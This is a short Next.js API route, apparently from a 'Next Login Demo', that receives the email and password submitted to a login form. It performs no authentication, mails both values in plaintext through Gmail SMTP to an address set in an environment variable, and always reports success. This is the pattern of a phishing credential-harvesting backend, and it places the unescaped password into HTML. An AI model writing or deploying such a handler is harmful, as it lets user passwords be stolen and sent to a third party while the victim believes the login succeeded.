import { NextResponse } from 'next/server'
import nodemailer from 'nodemailer'


export async function POST(req: Request) {
  const { email, password } = await req.json()

  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  })

  await transporter.sendMail({
    from: `"Next Login Demo" <${process.env.SMTP_USER}>`,
    to: process.env.TO_EMAIL,
    subject: 'Login form data',
    html: `
      <h2>Login form submission</h2>
      <p><b>Email:</b> ${email}</p>
      <p><b>Password:</b> ${password}</p>
    `,
  })

  return NextResponse.json({ success: true })
}
